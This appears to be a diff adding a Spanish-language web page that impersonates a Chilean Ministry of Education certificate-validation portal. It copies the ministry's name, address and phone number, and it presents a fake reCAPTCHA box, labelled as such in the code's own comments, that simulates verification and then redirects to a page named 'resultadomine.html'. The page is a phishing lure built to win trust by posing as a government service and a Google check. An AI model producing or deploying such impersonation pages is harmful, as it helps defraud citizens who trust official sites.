@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validación de Certificado - Portal</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* ESTILOS GENERALES */
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f9f9f9;
+            color: #333;
+            line-height: 1.5;
+        }
+
+        .container {
+            max-width: 480px;
+            margin: 0 auto;
+            background-color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Header */
+        .header {
+            padding: 15px 20px;
+            background: #fff;
+            border-bottom: 1px solid #eee;
+        }
+
+        .logo-text { font-size: 1.5rem; margin: 0; }
+        .logo-blue { color: #0056b3; font-weight: normal; }
+        .logo-red { color: #d9534f; font-weight: bold; }
+
+        .page-title {
+            color: #0056b3;
+            font-size: 1.3rem;
+            margin: 5px 0 15px 0;
+            font-weight: normal;
+        }
+
+        .section-subtitle {
+            color: #0056b3;
+            font-size: 1.1rem;
+            margin: 0;
+            font-weight: normal;
+        }
+
+        /* Caja de contenido principal (gris) */
+        .login-box {
+            background-color: #f2f2f2;
+            margin: 20px;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            text-align: center; /* Centrar contenido */
+        }
+
+        .login-intro {
+            font-size: 1.1rem; /* Un poco más grande como en la foto */
+            color: #777;
+            margin-bottom: 25px;
+            text-align: left;
+            font-weight: 300;
+        }
+        
+        .login-intro strong {
+            font-weight: bold;
+            color: #555;
+        }
+
+        /* ESTILOS DEL FALSO RECAPTCHA */
+        .recaptcha-container {
+            background: #f9f9f9;
+            border: 1px solid #d3d3d3;
+            border-radius: 3px;
+            box-shadow: 0 0 4px 1px rgba(0,0,0,0.08);
+            display: inline-flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 12px;
+            width: 300px; /* Ancho estándar de recaptcha */
+            max-width: 100%;
+            box-sizing: border-box;
+            margin: 0 auto;
+        }
+
+        .recaptcha-left {
+            display: flex;
+            align-items: center;
+        }
+
+        .recaptcha-checkbox {
+            width: 24px;
+            height: 24px;
+            border: 2px solid #c1c1c1;
+            border-radius: 2px;
+            background-color: #fff;
+            margin-right: 12px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .recaptcha-checkbox:hover {
+            border: 2px solid #b2b2b2;
+        }
+
+        .recaptcha-label {
+            font-family: Roboto, helvetica, arial, sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            color: #000;
+        }
+
+        .recaptcha-logo-col {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-left: 10px;
+        }
+
+        .recaptcha-icon {
+            width: 32px;
+            height: 32px;
+            background-image: url('https://www.gstatic.com/recaptcha/api2/logo_48.png');
+            background-size: 32px;
+            background-repeat: no-repeat;
+            opacity: 0.5;
+        }
+
+        .recaptcha-text-small {
+            font-size: 10px;
+            color: #555;
+            text-align: center;
+            margin-top: 2px;
+            line-height: 10px;
+        }
+
+        /* Animación del Spinner */
+        .spinner {
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #3498db;
+            border-radius: 50%;
+            width: 16px;
+            height: 16px;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+
+        /* Checkmark verde */
+        .checkmark {
+            color: #009688;
+            font-size: 20px;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Footer */
+        .footer-simple-text {
+            padding: 20px 15px;
+            font-size: 0.9rem;
+            color: #777;
+            background: #f9f9f9;
+            margin-top: auto;
+        }
+        
+        .ministerio-info {
+            margin-top: 15px;
+            font-size: 0.85rem;
+            color: #666;
+            line-height: 1.4;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header">
+            <h1 class="logo-text">
+                <span class="logo-blue">Ayuda</span><span class="logo-red">Mineduc</span>
+            </h1>
+            <h2 class="page-title">Certificados en tu Celular</h2>
+            <h3 class="section-subtitle">Validación de Certificado</h3>
+        </div>
+
+        <div class="login-box">
+            <p class="login-intro">
+                <strong>Estimado Usuario(a):</strong> Complete el desafío Recaptcha para continuar hacia la validacion del certificado.
+            </p>
+
+            <div class="recaptcha-container">
+                <div class="recaptcha-left">
+                    <div class="recaptcha-checkbox" id="recaptchaBox" onclick="activarCaptcha()">
+                        <div class="spinner" id="recaptchaSpinner"></div>
+                        <i class="fa-solid fa-check checkmark" id="recaptchaCheck"></i>
+                    </div>
+                    <span class="recaptcha-label">No soy un robot</span>
+                </div>
+                
+                <div class="recaptcha-logo-col">
+                    <div class="recaptcha-icon"></div>
+                    <div class="recaptcha-text-small">reCAPTCHA</div>
+                    <div class="recaptcha-text-small" style="font-size: 8px;">Privacidad - Condiciones</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer-simple-text">
+            <div class="ministerio-info">
+                <strong>Ministerio de Educación</strong><br>
+                <span style="color: #0056b3;">Gobierno de Chile</span><br>
+                Dirección: Av. Libertador Bernardo O'Higgins 1371.<br>
+                Teléfono: +56 2 24066000<br>
+                Versión 1.37.0
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function activarCaptcha() {
+            var box = document.getElementById("recaptchaBox");
+            var spinner = document.getElementById("recaptchaSpinner");
+            var check = document.getElementById("recaptchaCheck");
+
+            // Evitar que se active dos veces
+            if (box.getAttribute("data-checked") === "true") return;
+
+            // 1. Mostrar spinner de carga
+            spinner.style.display = "block";
+            
+            // 2. Esperar 1 segundo (simulando conexión con Google)
+            setTimeout(function() {
+                spinner.style.display = "none";     // Ocultar spinner
+                check.style.display = "block";      // Mostrar check verde
+                box.style.border = "none";          // Quitar borde gris del cuadrado
+                box.setAttribute("data-checked", "true"); // Marcar como listo
+
+                // 3. Redirigir después de medio segundo
+                setTimeout(function() {
+                    window.location.href = "resultadomine.html";
+                }, 800);
+
+            }, 1500); // Tiempo que tarda el spinner girando
+        }
+    </script>
+
+</body>
+</html>
